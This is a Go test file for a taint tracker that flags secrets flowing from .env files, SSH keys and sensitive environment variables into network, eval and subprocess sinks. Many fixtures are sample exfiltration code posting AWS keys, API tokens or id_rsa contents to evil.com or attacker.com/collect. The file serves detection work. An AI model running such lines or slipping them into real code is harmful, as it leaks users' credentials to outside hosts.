package taint

import (
	"testing"
)

func TestTracker_CredentialFile_Python(t *testing.T) {
	tracker := NewTracker()
	code := `api_key = open(".env").read()`

	tracker.TrackFile(code)

	if len(tracker.taintedVars) != 1 {
		t.Errorf("expected 1 tainted var, got %d", len(tracker.taintedVars))
	}

	if taint, found := tracker.taintedVars["api_key"]; !found {
		t.Error("expected api_key to be tainted")
	} else {
		if taint.Source != SourceCredentialFile {
			t.Errorf("expected source SourceCredentialFile, got %v", taint.Source)
		}
		if taint.SourcePath != ".env" {
			t.Errorf("expected source path .env, got %s", taint.SourcePath)
		}
	}
}

func TestTracker_EnvVar_Python(t *testing.T) {
	tracker := NewTracker()
	code := `api_key = os.getenv("API_KEY")`

	tracker.TrackFile(code)

	if taint, found := tracker.taintedVars["api_key"]; !found {
		t.Error("expected api_key to be tainted")
	} else {
		if taint.Source != SourceEnvVar {
			t.Errorf("expected source SourceEnvVar, got %v", taint.Source)
		}
		if taint.SourcePath != "API_KEY" {
			t.Errorf("expected source path API_KEY, got %s", taint.SourcePath)
		}
	}
}

func TestTracker_EnvVar_JavaScript(t *testing.T) {
	tracker := NewTracker()
	code := `const apiKey = process.env.API_KEY`

	tracker.TrackFile(code)

	if taint, found := tracker.taintedVars["apiKey"]; !found {
		t.Error("expected apiKey to be tainted")
	} else {
		if taint.Source != SourceEnvVar {
			t.Errorf("expected source SourceEnvVar, got %v", taint.Source)
		}
	}
}

func TestTracker_EnvVar_Go(t *testing.T) {
	tracker := NewTracker()
	code := `apiKey := os.Getenv("API_KEY")`

	tracker.TrackFile(code)

	if taint, found := tracker.taintedVars["apiKey"]; !found {
		t.Error("expected apiKey to be tainted")
	} else {
		if taint.Source != SourceEnvVar {
			t.Errorf("expected source SourceEnvVar, got %v", taint.Source)
		}
	}
}

func TestTracker_SensitiveFile_SSH(t *testing.T) {
	tracker := NewTracker()
	code := `private_key = open("/home/user/.ssh/id_rsa").read()`

	tracker.TrackFile(code)

	if taint, found := tracker.taintedVars["private_key"]; !found {
		t.Error("expected private_key to be tainted")
	} else {
		if taint.Source != SourceSensitiveFile {
			t.Errorf("expected source SourceSensitiveFile, got %v", taint.Source)
		}
	}
}

func TestTracker_Propagation_DirectAssignment(t *testing.T) {
	tracker := NewTracker()
	code := `
api_key = os.getenv("API_KEY")
secret = api_key
`

	tracker.TrackFile(code)

	if _, found := tracker.taintedVars["api_key"]; !found {
		t.Error("expected api_key to be tainted")
	}

	if taint, found := tracker.taintedVars["secret"]; !found {
		t.Error("expected secret to be tainted via propagation")
	} else {
		if taint.Source != SourceEnvVar {
			t.Errorf("expected propagated source SourceEnvVar, got %v", taint.Source)
		}
	}
}

func TestTracker_Propagation_MultiHop(t *testing.T) {
	tracker := NewTracker()
	code := `
api_key = os.getenv("API_KEY")
secret = api_key
payload = secret
`

	tracker.TrackFile(code)

	if _, found := tracker.taintedVars["payload"]; !found {
		t.Error("expected payload to be tainted via multi-hop propagation")
	}
}

func TestTracker_NetworkSink_Python(t *testing.T) {
	tracker := NewTracker()
	code := `
api_key = os.getenv("API_KEY")
requests.post("http://evil.com", data=api_key)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}

	flow := flows[0]
	if flow.SinkType != SinkNetwork {
		t.Errorf("expected SinkNetwork, got %v", flow.SinkType)
	}
	if flow.Variable.Name != "api_key" {
		t.Errorf("expected variable api_key, got %s", flow.Variable.Name)
	}
	if flow.Severity != "CRITICAL" && flow.Severity != "HIGH" {
		t.Errorf("expected CRITICAL or HIGH severity, got %s", flow.Severity)
	}
}

func TestTracker_NetworkSink_JavaScript(t *testing.T) {
	tracker := NewTracker()
	code := `
const token = process.env.AUTH_TOKEN
fetch("http://evil.com", { body: token })
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}

	if flows[0].SinkType != SinkNetwork {
		t.Errorf("expected SinkNetwork, got %v", flows[0].SinkType)
	}
}

func TestTracker_EvalSink(t *testing.T) {
	tracker := NewTracker()
	code := `
cmd = os.getenv("API_KEY")
eval(cmd)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}

	flow := flows[0]
	if flow.SinkType != SinkEval {
		t.Errorf("expected SinkEval, got %v", flow.SinkType)
	}
	if flow.Severity != "CRITICAL" {
		t.Errorf("expected CRITICAL severity for eval sink, got %s", flow.Severity)
	}
}

func TestTracker_SubprocessSink(t *testing.T) {
	tracker := NewTracker()
	code := `
command = os.getenv("API_KEY")
subprocess.call(command)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}

	if flows[0].SinkType != SinkSubprocess {
		t.Errorf("expected SinkSubprocess, got %v", flows[0].SinkType)
	}
}

func TestTracker_PropagationWithSink(t *testing.T) {
	tracker := NewTracker()
	code := `
api_key = open(".env").read()
secret = api_key
requests.post("http://evil.com", data=secret)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}

	flow := flows[0]
	if flow.Variable.Name != "secret" {
		t.Errorf("expected tainted variable secret, got %s", flow.Variable.Name)
	}
	if flow.Variable.Source != SourceCredentialFile {
		t.Errorf("expected source SourceCredentialFile, got %v", flow.Variable.Source)
	}
	if flow.SinkType != SinkNetwork {
		t.Errorf("expected SinkNetwork, got %v", flow.SinkType)
	}
}

func TestTracker_NoSink_NoFlow(t *testing.T) {
	tracker := NewTracker()
	code := `
api_key = os.getenv("API_KEY")
print("API key loaded")
`

	flows := tracker.TrackFile(code)

	if len(flows) != 0 {
		t.Errorf("expected 0 flows (no sink), got %d", len(flows))
	}
}

func TestTracker_NonSensitiveEnvVar_NoTaint(t *testing.T) {
	tracker := NewTracker()
	code := `
home = os.getenv("HOME")
path = os.getenv("PATH")
requests.post("http://example.com", data=home)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 0 {
		t.Errorf("expected 0 flows (non-sensitive env vars), got %d", len(flows))
	}
}

func TestTracker_DirectFlow_NoIntermediate(t *testing.T) {
	tracker := NewTracker()
	code := `
requests.post("http://evil.com", data=os.getenv("API_KEY"))
`

	flows := tracker.TrackFile(code)

	if len(flows) != 0 {
		t.Logf("Note: Direct source-to-sink without variable assignment is not tracked (expected limitation)")
	}
}

func TestTracker_MultipleFlows(t *testing.T) {
	tracker := NewTracker()
	code := `
api_key = os.getenv("API_KEY")
db_pass = os.getenv("DB_PASSWORD")
requests.post("http://evil.com", data=api_key)
requests.post("http://evil.com", json=db_pass)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 2 {
		t.Errorf("expected 2 flows, got %d", len(flows))
	}
}

func TestTracker_SensitiveEnvVar_Detection(t *testing.T) {
	testCases := []struct {
		name      string
		varName   string
		sensitive bool
	}{
		{"API_KEY", "API_KEY", true},
		{"TOKEN", "AUTH_TOKEN", true},
		{"SECRET", "APP_SECRET", true},
		{"PASSWORD", "DB_PASSWORD", true},
		{"CREDENTIAL", "AWS_CREDENTIAL", true},
		{"HOME", "HOME", false},
		{"PATH", "PATH", false},
		{"USER", "USER", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := isSensitiveEnvVar(tc.varName)
			if result != tc.sensitive {
				t.Errorf("isSensitiveEnvVar(%q) = %v, want %v", tc.varName, result, tc.sensitive)
			}
		})
	}
}

func TestTracker_ExtractVarName(t *testing.T) {
	testCases := []struct {
		expr     string
		expected string
	}{
		{"api_key", "api_key"},
		{"data=api_key", "api_key"},
		{"json=secret", "secret"},
		{" token ", "token"},
		{"key, value", "value"},
	}

	for _, tc := range testCases {
		t.Run(tc.expr, func(t *testing.T) {
			result := extractVarName(tc.expr)
			if result != tc.expected {
				t.Errorf("extractVarName(%q) = %q, want %q", tc.expr, result, tc.expected)
			}
		})
	}
}

func TestTracker_RealWorld_CredentialExfiltration(t *testing.T) {
	tracker := NewTracker()
	code := `
import os
import requests

def exfiltrate_creds():
    aws_key = os.getenv("AWS_ACCESS_KEY_ID")
    aws_secret = os.getenv("AWS_SECRET_ACCESS_KEY")
    
    creds = aws_key
    
    payload = creds
    
    requests.post("https://attacker.com/collect", json=payload)
`

	flows := tracker.TrackFile(code)

	if len(flows) < 1 {
		t.Fatalf("expected at least 1 flow for credential exfiltration, got %d", len(flows))
	}

	hasNetworkSink := false
	for _, flow := range flows {
		if flow.SinkType == SinkNetwork {
			hasNetworkSink = true
			if flow.Variable.Source != SourceEnvVar {
				t.Errorf("expected SourceEnvVar, got %v", flow.Variable.Source)
			}
		}
	}

	if !hasNetworkSink {
		t.Error("expected at least one network sink flow")
	}
}

func TestTracker_JavaScript_FullFlow(t *testing.T) {
	tracker := NewTracker()
	code := `
const apiKey = process.env.OPENAI_API_KEY
const secret = apiKey
fetch("https://evil.com", { method: "POST", body: secret })
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}

	flow := flows[0]
	if flow.Variable.Name != "secret" {
		t.Errorf("expected variable secret, got %s", flow.Variable.Name)
	}
	if flow.SinkType != SinkNetwork {
		t.Errorf("expected SinkNetwork, got %v", flow.SinkType)
	}
}

func TestTracker_Go_FullFlow(t *testing.T) {
	tracker := NewTracker()
	code := `
apiKey := os.Getenv("API_KEY")
secret := apiKey
http.Post("https://evil.com", "text/plain", secret)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}
}

func TestTracker_NoSource_NoTaint(t *testing.T) {
	tracker := NewTracker()
	code := `
safe_var = "hello world"
requests.post("http://example.com", data=safe_var)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 0 {
		t.Errorf("expected 0 flows (no tainted source), got %d", len(flows))
	}
}

func TestTracker_SourceAfterSink_StillDetected(t *testing.T) {
	tracker := NewTracker()
	code := `
requests.post("http://evil.com", data=api_key)
api_key = os.getenv("API_KEY")
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Errorf("expected 1 flow, got %d", len(flows))
	}
}

func TestTracker_MultipleSourceTypes(t *testing.T) {
	tracker := NewTracker()
	code := `
env_key = os.getenv("API_KEY")
file_key = open(".env").read()
ssh_key = open("~/.ssh/id_rsa").read()
`

	tracker.TrackFile(code)

	if len(tracker.taintedVars) != 3 {
		t.Errorf("expected 3 tainted vars, got %d", len(tracker.taintedVars))
	}

	if taint, found := tracker.taintedVars["env_key"]; !found || taint.Source != SourceEnvVar {
		t.Error("expected env_key to be SourceEnvVar")
	}
	if taint, found := tracker.taintedVars["file_key"]; !found || taint.Source != SourceCredentialFile {
		t.Error("expected file_key to be SourceCredentialFile")
	}
	if taint, found := tracker.taintedVars["ssh_key"]; !found || taint.Source != SourceSensitiveFile {
		t.Error("expected ssh_key to be SourceSensitiveFile")
	}
}

func TestTracker_MultipleSinkTypes(t *testing.T) {
	tracker := NewTracker()
	code := `
key = os.getenv("API_KEY")
cmd = key
data = key
code = key

requests.post("http://evil.com", data=data)
subprocess.call(cmd)
eval(code)
`

	flows := tracker.TrackFile(code)

	if len(flows) < 3 {
		t.Fatalf("expected at least 3 flows (network, subprocess, eval), got %d", len(flows))
	}

	sinkTypes := make(map[SinkType]bool)
	for _, flow := range flows {
		sinkTypes[flow.SinkType] = true
	}

	if !sinkTypes[SinkNetwork] {
		t.Error("expected at least one SinkNetwork flow")
	}
	if !sinkTypes[SinkSubprocess] {
		t.Error("expected at least one SinkSubprocess flow")
	}
	if !sinkTypes[SinkEval] {
		t.Error("expected at least one SinkEval flow")
	}
}

func TestTracker_SeverityLevels(t *testing.T) {
	testCases := []struct {
		name             string
		code             string
		expectedSeverity string
	}{
		{
			name: "CredentialFile_Critical",
			code: `
key = open(".env").read()
requests.post("http://evil.com", data=key)
`,
			expectedSeverity: "CRITICAL",
		},
		{
			name: "SensitiveFile_Critical",
			code: `
ssh = open("~/.ssh/id_rsa").read()
requests.post("http://evil.com", data=ssh)
`,
			expectedSeverity: "CRITICAL",
		},
		{
			name: "EnvVar_High",
			code: `
key = os.getenv("API_KEY")
requests.post("http://evil.com", data=key)
`,
			expectedSeverity: "HIGH",
		},
		{
			name: "Eval_Critical",
			code: `
key = os.getenv("API_KEY")
eval(key)
`,
			expectedSeverity: "CRITICAL",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			tracker := NewTracker()
			flows := tracker.TrackFile(tc.code)

			if len(flows) != 1 {
				t.Fatalf("expected 1 flow, got %d", len(flows))
			}

			if flows[0].Severity != tc.expectedSeverity {
				t.Errorf("expected severity %s, got %s", tc.expectedSeverity, flows[0].Severity)
			}
		})
	}
}

func TestTracker_EmptyCode_NoFlows(t *testing.T) {
	tracker := NewTracker()
	flows := tracker.TrackFile("")

	if len(flows) != 0 {
		t.Errorf("expected 0 flows for empty code, got %d", len(flows))
	}
}

func TestTracker_LineNumbers(t *testing.T) {
	tracker := NewTracker()
	code := `line 1
api_key = os.getenv("API_KEY")
line 3
secret = api_key
line 5
requests.post("http://evil.com", data=secret)
`

	flows := tracker.TrackFile(code)

	if len(flows) != 1 {
		t.Fatalf("expected 1 flow, got %d", len(flows))
	}

	flow := flows[0]
	if flow.Variable.LineNum != 2 {
		t.Errorf("expected source line 2, got %d", flow.Variable.LineNum)
	}
	if flow.SinkLineNum != 6 {
		t.Errorf("expected sink line 6, got %d", flow.SinkLineNum)
	}
}
